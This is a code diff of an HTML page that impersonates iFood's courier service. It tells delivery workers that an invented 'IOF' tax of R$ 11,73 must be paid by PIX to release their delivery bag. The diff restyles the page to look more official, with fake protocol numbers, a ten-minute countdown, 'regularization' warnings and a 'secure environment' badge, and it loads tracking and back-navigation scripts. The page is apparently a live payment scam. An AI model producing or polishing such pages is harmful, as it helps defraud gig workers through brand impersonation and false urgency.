@@ -1,18 +1,15 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#EA1D2C">
     <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="default">
-    <title>iFood Entregador - Taxa de IOF da Bag</title>
-    <meta name="description" content="Pagamento confirmado. Finalize a taxa de IOF da bag para liberar sua documentacao.">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>Notificacao de Liberacao da Bag - iFood Entregador</title>
+    <meta name="description" content="Pagamento do frete confirmado. Quite a taxa de IOF da Bag iFood para liberar o envio.">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700;800;900&display=swap">
+    <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="style.css?v=3.8">
     <script src="/backguard.js?v=1.5"></script>
     <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
@@ -26,84 +23,144 @@
         document.head.appendChild(a);
     </script>
     <script async defer src="js/pixel.js"></script>
+    <style>
+        body {
+            font-family: 'Rawline', 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            color: #333;
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .ifood-red {
+            background-color: #EA1D2C;
+        }
+
+        .ifood-border {
+            border-top: 6px solid #EA1D2C;
+        }
+
+        .btn-ifood {
+            background-color: #EA1D2C;
+        }
+
+        .btn-ifood:hover {
+            background-color: #cf1725;
+        }
+
+        .legal-text {
+            color: #555;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+    </style>
 </head>
 
-<body data-page="upsell-iof">
-    <header class="header">
-        <div class="logo-container">
-            <img src="assets/ifoodentregadores.webp" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
-        </div>
-    </header>
+<body data-page="upsell-iof" class="flex flex-col min-h-screen">
 
-    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
-
-    <main class="container">
-        <section class="step upsell-step upsell-iof-step" aria-hidden="false">
-            <div class="badge-container">
-                <span class="badge">Etapa 1 de 2</span>
+    <div id="upsellScreen">
+        <header class="bg-white w-full shadow-sm">
+            <div class="max-w-7xl mx-auto px-6 py-8 flex justify-start items-center">
+                <img src="assets/ifoodentregadores.webp" class="h-14 md:h-16" alt="iFood Entregador">
             </div>
+            <div class="ifood-red w-full h-2 shadow-md"></div>
+        </header>
 
-            <h2 class="upsell-title">Pagamento do frete confirmado, <span id="upsell-iof-lead-name">parceiro</span>.</h2>
-            <p class="upsell-subtitle">Para concluir a emissao da bag, falta quitar a taxa de IOF aplicada sobre este pedido.</p>
+        <main class="flex-grow p-4 md:p-10">
+            <div class="max-w-2xl mx-auto bg-white ifood-border shadow-md overflow-hidden">
 
-            <div class="upsell-iof-hero" aria-label="Bag oficial do iFood">
-                <img
-                    src="assets/bagfoto-home.webp"
-                    alt="Bag oficial iFood"
-                    class="upsell-iof-hero__img"
-                    loading="eager"
-                    decoding="async">
-            </div>
-
-            <div class="upsell-urgency upsell-iof-urgency">
-                <div class="upsell-urgency__left">
-                    <strong>Taxa regulatoria de IOF para liberacao da bag</strong>
-                    <span>Esta condicao expira em <b id="upsell-iof-timer">10:00</b></span>
+                <div class="bg-gray-50 py-10 px-8 flex flex-col items-center border-b border-gray-100">
+                    <img src="assets/bagfoto-home.webp" class="h-28 object-contain mb-4" alt="Bag iFood">
+                    <p class="text-[12px] font-bold text-gray-500 uppercase tracking-[0.3em]">Central de Logistica iFood Bag</p>
                 </div>
-                <div class="upsell-urgency__price">
-                    <span>Valor unico</span>
-                    <strong id="upsell-iof-price">R$ 11,73</strong>
+
+                <div class="p-6 md:p-12">
+                    <div class="flex justify-between items-center mb-10 pb-4 border-b border-gray-100">
+                        <div class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">
+                            EMISSAO: <span id="current-date"></span>
+                        </div>
+                        <div class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">
+                            REF: IFB-IOF-2026
+                        </div>
+                    </div>
+
+                    <h1 class="text-[#EA1D2C] text-2xl font-black leading-tight mb-8">
+                        Confirmacao de liberacao da sua Bag iFood
+                    </h1>
+
+                    <div class="space-y-6 text-[#333] text-[15px] leading-relaxed mb-10 text-justify">
+                        <p>
+                            <strong><span id="upsell-iof-lead-name">Parceiro</span></strong>, seu pagamento de frete foi confirmado
+                            para <strong><span id="upsell-iof-current-frete">Frete padrao iFood</span></strong>.
+                            Para concluir a emissao desta bag no seu CPF, existe uma taxa obrigatoria de
+                            <strong>IOF logistico</strong> vinculada ao protocolo
+                            <strong>#<span id="upsell-iof-current-txid">--</span></strong>.
+                        </p>
+
+                        <p>
+                            A quitacao da taxa no valor de
+                            <strong class="text-black text-lg" id="upsell-iof-price">R$ 11,73</strong>
+                            libera a finalizacao da documentacao e ativa o proximo passo da sua entrega.
+                        </p>
+
+                        <div class="bg-yellow-50 p-6 border-l-4 border-yellow-500">
+                            <p class="text-gray-900 font-bold text-sm mb-3 uppercase tracking-tight">Aviso de regularizacao:</p>
+                            <p class="legal-text italic">
+                                Esta taxa e vinculada ao processo de emissao da Bag iFood. Sem essa regularizacao,
+                                o pedido fica em pendencia operacional e nao segue para despacho final.
+                                Para concluir hoje, finalize o pagamento dentro do prazo desta sessao:
+                                <strong id="upsell-iof-timer">10:00</strong>.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-50 rounded-lg p-8 mb-8 border border-gray-200">
+                        <div class="flex justify-between items-center mb-2">
+                            <span class="text-xs font-bold text-gray-400 uppercase tracking-widest">Natureza da taxa:</span>
+                            <span class="text-xs font-bold text-gray-700">Regularizacao IOF da Bag</span>
+                        </div>
+                        <div class="flex justify-between items-center border-t border-gray-200 pt-6 mt-4">
+                            <span class="text-md font-black text-gray-800 uppercase tracking-tighter">Total a pagar:</span>
+                            <span class="text-4xl font-black text-black tracking-tighter">R$ 11,73</span>
+                        </div>
+                    </div>
+
+                    <button id="btn-upsell-iof-accept" type="button"
+                        class="block w-full btn-ifood text-white text-center py-6 rounded font-bold text-xl shadow-sm transition-all mb-4">
+                        Pagar taxa de IOF e liberar bag
+                    </button>
+
+                    <button id="btn-upsell-iof-skip" type="button"
+                        class="block w-full bg-white border border-gray-300 text-gray-700 text-center py-4 rounded font-bold text-sm hover:bg-gray-50 transition-all mb-6">
+                        Continuar sem pagar agora
+                    </button>
+
+                    <div id="upsell-iof-loading" class="hidden flex items-center justify-center gap-2 mb-8 text-sm text-gray-600">
+                        <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-[#EA1D2C]"></div>
+                        <span>Gerando PIX da taxa de IOF...</span>
+                    </div>
+
+                    <div class="flex items-center justify-center gap-2 opacity-50">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#EA1D2C">
+                            <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"></path>
+                        </svg>
+                        <span class="text-[10px] font-bold text-gray-500 uppercase tracking-[0.2em]">Ambiente seguro - iFood Entregador</span>
+                    </div>
                 </div>
             </div>
 
-            <div class="upsell-summary upsell-iof-summary">
-                <div class="upsell-summary__row">
-                    <span>Frete escolhido</span>
-                    <strong id="upsell-iof-current-frete">Frete padrao iFood</strong>
+            <div class="mt-12 text-center text-gray-400 max-w-2xl mx-auto pb-20 px-6">
+                <div class="grid grid-cols-3 gap-2 mb-8 opacity-40 grayscale pointer-events-none uppercase font-black text-[8px] tracking-widest">
+                    <span class="border-r border-gray-300 px-2">IFOOD BAG</span>
+                    <span class="border-r border-gray-300 px-2">LOGISTICA</span>
+                    <span class="px-2">ENTREGADOR</span>
                 </div>
-                <div class="upsell-summary__row">
-                    <span>ID do pagamento anterior</span>
-                    <strong id="upsell-iof-current-txid">--</strong>
-                </div>
-                <div class="upsell-summary__row upsell-summary__row--highlight">
-                    <span>Taxa de IOF da bag</span>
-                    <strong>R$ 11,73</strong>
-                </div>
+                <p class="text-[9px] font-medium leading-relaxed italic opacity-60">
+                    Processo de regularizacao valido apenas para esta sessao.
+                </p>
             </div>
-
-            <div class="upsell-explain upsell-iof-explain">
-                <h3>Por que existe essa taxa de IOF?</h3>
-                <p>A taxa de <strong>R$ 11,73</strong> cobre o registro financeiro desta liberacao e valida a bag no seu CPF.</p>
-                <ul>
-                    <li>Regularizacao fiscal da emissao da bag</li>
-                    <li>Liberacao do pedido para despacho final</li>
-                    <li>Atualizacao imediata no seu protocolo de entrega</li>
-                </ul>
-            </div>
-
-            <div class="action-stack">
-                <button id="btn-upsell-iof-accept" class="btn-primary" type="button">Pagar taxa de IOF de R$ 11,73</button>
-                <button id="btn-upsell-iof-skip" class="btn-secondary" type="button">Continuar sem pagar agora</button>
-            </div>
-
-            <div id="upsell-iof-loading" class="inline-loading hidden" aria-hidden="true">
-                <div class="spinner spinner--sm" aria-hidden="true"></div>
-                <span>Gerando PIX da taxa de IOF...</span>
-            </div>
-
-            <p class="small-text">A bag segue reservada para seu CPF nesta sessao.</p>
-        </section>
-    </main>
+        </main>
+    </div>
 
     <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
 
@@ -120,12 +177,15 @@
         </div>
     </div>
 
-    <footer class="footer">
-        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
-    </footer>
-
+    <script>
+        (function setDate() {
+            var now = new Date();
+            var options = { day: '2-digit', month: '2-digit', year: 'numeric' };
+            var field = document.getElementById('current-date');
+            if (field) field.textContent = now.toLocaleDateString('pt-BR', options);
+        })();
+    </script>
     <script src="script.js?v=7.3" defer></script>
 </body>
 
 </html>
-
